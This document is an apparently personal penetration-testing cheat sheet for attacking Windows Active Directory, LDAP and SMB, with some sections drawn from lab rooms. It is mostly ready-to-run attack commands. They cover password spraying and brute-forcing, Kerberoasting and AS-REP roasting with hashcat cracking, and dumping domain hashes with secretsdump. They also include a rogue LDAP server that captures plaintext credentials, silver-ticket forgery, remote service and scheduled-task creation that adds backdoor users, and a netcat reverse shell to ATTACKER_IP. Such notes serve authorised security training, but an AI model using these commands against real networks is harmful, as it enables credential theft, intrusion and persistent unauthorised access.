This file is for enumerating Active Directory/LDAP and SMB.


Port 53 is all about DNS
Port 135/TCP and 49152-65535/TCP, - DCOM: RPC over IP.
	sc.exe and WMI. You can also use Wsman - WinRM
		$username = 'Administrator';
		$password = 'Mypass123';
		$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
		$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
		$Opt = New-CimSessionOption -Protocol DCOM
		$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

	Remote process creation:
		$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value userwashere";
		Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
		CommandLine = $Command
		}

Port 139 - NetBIOS - used for older SMB protocols
Port 464 - Kerberos password changes
Port 445 - SMB - newer protocols TCP stack
	if 139/445 ports exist, and you have Admin rights, spawn a shell:
		psexec64.exe \\MACHINE_IP -u Administrator -p password -i cmd.exe
Port 593 - RPC over http
Port 593 - LDAP
https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0
Port 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	If ports exist, use evilwinrm or winrs:
		winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
		evil-winrm -i 10.10.10.10 -u hostname.local\\Administrator -H <hash>
	PowerShell is another option:
		$username = 'Administrator';
		$password = 'password';
		$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
		$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
		Enter-PSSession -Computername TARGET -Credential $credential
			OR
		Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

[*] DNSRecon - scan subnet for reverse lookup
	dnsrecon -d <domain ip> -r <range of subnet>
		dnsrecon -d 10.10.10.100 -r 10.0.0.0/8

[*] nslookup - hostname search
	this will hopefully leak a hostname
	nslookup
	server <ip address>
	127.0.0.1
	127.0.0.2

[*] ping - check ttl
	127 will be windows
	64 will be Linux
	above 128 it will most likely be a network device like Cisco
	ping -c 4 <ip address>


[*] Use to enumerate smb:
        rpcclient -U '' <IP addr>
            enumdomusers
            querydispinfo
            queryuser <RID id, like 0x045>
        crackmapexec smb <ip addr> -u '' -p '' --shares
        crackmapexec smb <ip addr> -u '<username>' -p '<password>'
	crackmapexec smb <ip addr> -u '<username>' -p '<password>' --users
        crackmapexec winrm <ip addr> -u '<username>' -p '<password>'
	crackmapexec smb <ip addr> -u userlist.txt -p password_list.txt # password spray smbshares
		Remember when password spraying, you can go after other services. SMB is good but if there is another vulnerable machine on the network that connects to ldal/AD, you can steal creds from that box. If there is a proprietary box on the network, that has an LDAP service, and queries the AD controllers, you may get Admin creds there, bypassing password spraying and get domain admin.
        poetry run crackmapexec smb <ip addr>
	poetry run crackmapexec smb <ip addr> --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --pass-pol
	poetry run crackmapexec smb <ip addr> -u '' -p '' --users
	poetry run crackmapexec smb <ip addr> -u '' -p '' -M spider_plus
	poetry run crackmapexec smb <ip addr> -u '' -p '' --get-file \\share\file.txt file.txt
		# If file download fails, try another tool.
		smbclient -N //ip_addr/share
		get file.txt
		mget * # get all the files
	poetry run crackmapexec smb <ip_addr> -u /path/to/users.txt -p /path/to/password.txt #bruteforce creds for smb share
	poetry run crackmapexec winrm <ip_addr> -u user -p password # get a shell. Could fail. Always try new creds for enumerating shares and login
        smbclient -U '' -L <ip addr>
	smbclient -L <ip addr>
	smbclient \\\\10.10.10.10\sharename
	smbclient -U svc-admin%management2005 -L //spookysec.local
	smbclient //<ip address>/share
		recurse ON
		prompt OFF
		mget *

[*] Create random password list with known words:
        hashcat --force <password file> -r /usr/share/hashcat/rules/best64.rule --stdout > <file name>

[*] Attempt to figure out the password policy - avoid lockout on bruteforce
    crackmapexec smb <IP addr> --password-pol

[*] Use to enumerate LDAP/AD:
	ldapsearch <ip address>
	ldapsearch -H ldap://<ip_address>
	ldapsearch -H ldaps://<ip_address>
	ldapsearch -H ldap://<ip_address> -x -b "DC=htb,DC=local"
	ldapsearch -H ldap://<ip address> -x -s base namingcontexts
        ldapsearch -H ldap://<ip addr> -x -s base namingcontexts # Exactly as you see it, just add the IP address
        ldapsearch -H ldap://<ip addr> -x -s sub -b '<DC=domain,DC=com>'
	ldapsearch -H ldap://<ip addr> -x -b "DC=htb,DC=local" '(objectClass=Person)' # Looks for the objectClass in previous search, match to anything useful
		sAMAccountName: windows account name - use this for login.
	ldapsearch -H ldap://<ip_address> -x -b "DC=htb,DC=local" '(objectClass=user)' | grep 'sAMAccountName\|logon'
	ldapsearch -x -h <ip addr> -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType # query for useful content within sAMAccountName
	ldapsearch -x -h <ip addr> -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName # Use the names for a password spray


[*] LDAP Pass-Back Attack
	Assuming you have found a device running ldap, and you are unable to read the conf file, can you redirect the LDAP requests to your machine? If so, setup a rogue LDAP server on the attacker machine:
	sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
	sudo dpkg-reconfigure -p low slapd
	Reconfigure to match the original LDAP server:
		Omit OpenLDAP server config? No
		DNS Domain Name: Name.of.ldap.server
		Organization Name: Name.of.ldap.server # same name as above
		Administrator password: anypasswordworks
		Database backedn to use: MDB
		Do you want the database to be remove when slapd is purged? No
		Move old database: Yes
	Now downgrade LDAP to a supported auth mechanism, print in plaintext.
		vi olcSaslSecProps.ldif
PUT IN ldif FILE:

#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

		olcSaslSecProps: Specifies the SASL security properties
		noanonymous: Disables mechanisms that support anonymous login
		minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

		sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
		ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
			You should see PLAIN LOGIN values
		Now collect creds via ldap. If you see failure, just use a tcpdump:
			sudo tcpdump -SX -i eth0 tcp port 389

[*] Windows Epoc time
	Use a time converter since Windows does this weird:
	pswdlastset : <ldapquery will have a long time stamp>
		ihttps://www.epochconverter.com/ldap

[*] Create wordlists
	Generic wordlists:
		Months, seasons, years, !.
	If you don't know your victim, a generic wordlist makes sense. Also recommend running crackmapexec to an smb share in the environment to figure out password policy. Adjust password list to meet those requirements
	crackmapexec smb <ip addr> --pass-pol -u '' -p ''
	hashcat --force --stdout generic_wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort | uniq > new_password_list.txt
	You can also use "rsmangler" tool, just grep the notes for this tool


[*] Tool impacket is best installed in a virtual environment if not installed on OS already.
	virtualenv -p python3 impacket-github
	source impacket-github/bin/activate
	git clone https://github.com/SecureAuthCorp/impacket.git
	cd ~/git/impacket
	pip install -r requirements.txt
	python setup.py install

[*] Impacket as smb server
	impacket-smbserver -smb2support -user iamauser -password iamapassword share $(pwd) # current working directory as share
		On the victim machine:
			$pass = convertto-securestring 'iamapassword' -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential('iamauser', $pass)
			New-PSDrive -Name localshare -PSProvider FileSystem -Credential $cred -Root \\10.10.10.10\share
			cd localshare:

[*] SMB enumerate steps:
	smbmap -H IPADDR
	smbmap -H IPADDR -u anonymous
	smbmap -R <share> -H <host ip> # enumerate content in share
		Look for Groups.xml, we will find accounts
	smbmap -R <share> -H <host ip> -A Groups.xml -q
		Download Groups.xml
		Assuming we found groups.xml, go through and find hashed password, "cpassword"
			gpp-decrypt <hashed password>
	smbmap -d <domain> -u <user> -p <password> -H <host ip> # enumerate RW privs

[*] spin up an smb server on Kali - transfer files to/from Windows and Kali
        sudo impact-smbserver -smb2support <share-name> </path/to/share>
        sudo impact-smbserver -smb2support iamawesomeshare $(pwd)
        sudo impact-smbserver -username iamusername -password iampassword IamSomeShare $(pwd)
	sudo smbserver.py -user username -password password -smb2upport share $(pwd)

[*] Copy files from Windows to our Kali SMB server
	net use Z: \\ATTACKERIP\filename.txt /user:iamusername iampassword
	copy filename.txt Z: # File will now be in SMB share


[*] Query Kerberos for ASReproastable accounts, you just need a valid account name to test.
	./GetNPUsers.py spookysec.local/svc-admin
	./GetNPUsers.py -usersfile user_list_kerbroast.txt -dc-ip <ip_address> -request 'htb.local/' -format hashcat -ts # Include the forward slash in the request or the command will fail
	./GetNPUsers.py -dc-ip <ip addr> -request 'htb.local' -format hashcat
		hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
		crackmapexec smb <ip addr> -u <username> -p <cracked password> --shares #remove --shares to see if we can p0wn
			Remember, this doesn't have to be smb, you can use these creds on any service or box on the network that allows you to login
	

[*] impacket tool - secretsdump.py
	Part of impacket tools in github, use with credentials to pull passwords
	./secretsdump.py hostname/user:password@hostname
	Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

	[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets


[*] Once a shell has spawned on victim, create a mountable share (must use PowerShell)
        $pass = "iampassword" | ConvertTo-SecureString -AsPlainText -Force
        $pass # We should see some type of System.Security.Securestring
        $cred = New-Object System.Management.Automation.PsCredential('iamsomeusername', $pass)
        $cred # We should get our object printed with password as System.Security.SecureString
        New-PSDrive -name iamusername -root \\10.10.10.10\IamSomeShare -Credential $cred -PSProvider "filesystem"
             Go back to your Kali machine, scp/rsync your priv esc scripts or exploits to the smb share directory.
             Go bck to your Windows reverse shell and start attacking.
        .\winPEAS.exe cmd fat > winPEASfast.txt
             This is now in your smb share, stored on your Kali machine


[*] impacket tool - GetADUsers.py
        GetADUsers.py -all -dc-ip 10.10.10.100 domain/user

[*] impacket tool -  GetUserSPNs.py
        Query target domain for SPNs - Service Principal Name - unique identifier used by kerberos authentication
        GetUserSPNs.py -request -dc-ip 10.10.10.10 domain/user
                Kerberoasting - this should give you the hash of users that are kerberoast-able
                Copy/paste entire entry into a file to crack with hashcat
                hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
                Assuming Administrator was found, use psexec

[*] impacket tool - GetNPUsers.py
	Query target domain with "Do not require Kerberos preauth" set and export their TGT for cracking

[*] impacket tool - getST.py
	Get silver ticket if your user creds can ask for ticket.
	python3.8 getST.py -spn www/dc.domain.com -impersonate Administrator domain.com/user -hashes ntlm:hash
	export KRB5CCNAME=Administrator.ccache
	impacket-ipsexec -k -no-pass domain.com/Administrator@dc.domain.com


[*] Useful smb commands for connecting
	smbclient -N //10.10.10.10/share
	smbclient -U anonymous //10.10.10.10/share
	smbclient \\\\spookysec.local\\backup -U svc-admin
		You will be prompted for password, unless you supply -N flag
	smbclient -c 'put myservice.exe' -U username -W sub '//subsub.sub.domain.com/admin$/'
	smbclient -U username -W sub '//subsub.sub.domain.com/admin$/'
		Useful for connecting with an AD user

[*] Kerbrute tool - bruteforce users, password, and spray passwords
	https://github.com/ropnop/kerbrute/releases
	chmod 755 kerbrute_linux_amd64
- Examples running the tool
	./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local userlist.txt


[*] Install evil-winrm
	sudo gem install evil-winrm

	- Connect to remote host with a hash instead of password
		evil-winrm -i 10.10.10.10 -u hostname.local\\Administrator -H <hash>

[*] psexec - Microsoft tool to run processes remotely. Tri if a share is writeable
	psexec.py domain/user@10.10.10.10


[*] PowerShell - AD Objects
	If we are looking for all AD objects that were changed after a specific date
		Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
	Perform a password spraying attack without locking out accounts, we can use this to enumerate accounts that have a badPwdCount that is greater than 0, to avoid these accounts in our attack
		Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
	Retrieve additional information about the specific domain
		Get-ADDomain -Server za.tryhackme.com
	Force changing the password of our AD user
		Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)


[*] Useful tricks
	Assuming you have username and password, pull up your windows vm and type in the runas netonly command. MAKE SURE YOU OPEN CMD AS ADMIN BEFOR MOVING FORWARD.
		runas /netonly /user:USERNAME cmd
		Type in password
		You now have a cmd promp on local machine running as this non-existent user on your box. You can query the victim machine, tools like bloodhound
	On a windows network? Use "runas" to spawn a reverse shell with the /user token:
		runas /netonly /user:sub.domain.com\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
		cd ..\dir\to\Downloads
		dir \\10.10.10.10\share # verify you have a ticket
			If you do not have a share to look at, you should also check the SYSVOL, everyone has access
				dir \\domain.com\SYSVOL
				dir \\sub.domain.com\SYSVOL
				dir \\10.10.10.10\SYSVOL
					If you can't see this, good chance your creds failed
		Test-NetConnection -ComputerName 10.10.10.10 -Port 389
		.\SharpHound.exe -c -d <domain> --DomainController <ip address>
		.\SharpHound.exe -c all


[*] Remotely Creating Services Using sc
	From the TryHackMe lateralmovementandpivoting room.
	Ports:
		135/TCP, 49152-65535/TCP (DCE/RPC)
		445/TCP (RPC over SMB Named Pipes)
		139/TCP (RPC over SMB Named Pipes)
	Required Group Memberships: Administrators
	We can create a service on a remote host with sc.exe,it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC.
	A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
	If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).
	sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
	sc.exe \\TARGET start THMservice
		The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.
	Stop/Delete service:
		sc.exe \\TARGET stop THMservice
		sc.exe \\TARGET delete THMservice

[*] Creating Scheduled Tasks Remotely
	From the TryHackMe lateralmovementandpivoting room.
	Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks.
		schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
		schtasks /s TARGET /run /TN "THMtask1" 
	Keep in mind, this is a blind attack.
	We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway.
	Delete and cleanup once we are done:
		schtasks /S TARGET /TN "THMtask1" /DELETE /F

[*] Using DCOM to remotely work with Windows machines
	Ports:
		135/TCP, 49152-65535/TCP (DCERPC)
		5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	Required Group Memberships: Administrators

	- Connecting to WMI From Powershell
        	sc.exe and WMI. You can also use Wsman - WinRM
        	        $username = 'Administrator';
        	        $password = 'Mypass123';
        	        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        	        $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
        	        $Opt = New-CimSessionOption -Protocol DCOM
        	        $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

       - Remote process creation using WMI:
       	        $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value userwashere";
       	        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
       	        CommandLine = $Command
       	        }
		No Powershell? Use cmd:
			wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
	- Creating Services Remotely with WMI
		Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
		Name = "THMService2";
		DisplayName = "THMService2";
		PathName = "net user myuser Pass123 /add"; # Your payload
		ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
		StartMode = "Manual"
		}

		Get handled on service:
			$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
			Invoke-CimMethod -InputObject $Service -MethodName StartService
		Stop and Delete Service:
			Invoke-CimMethod -InputObject $Service -MethodName StopService
			Invoke-CimMethod -InputObject $Service -MethodName Delete
	- Creating Scheduled Tasks Remotely with WMI
		# Payload must be split in Command and Args
		$Command = "cmd.exe"
		$Args = "/c net user newuser newpassword /add"
		$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
		Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
		Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
		Delete the schedules task:
			Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
	- Installing MSI packages through WMI
		Once a file is on the target system, attempt to install via win32_product class:
			Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
		No PowerShell? use cmd:
			wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi

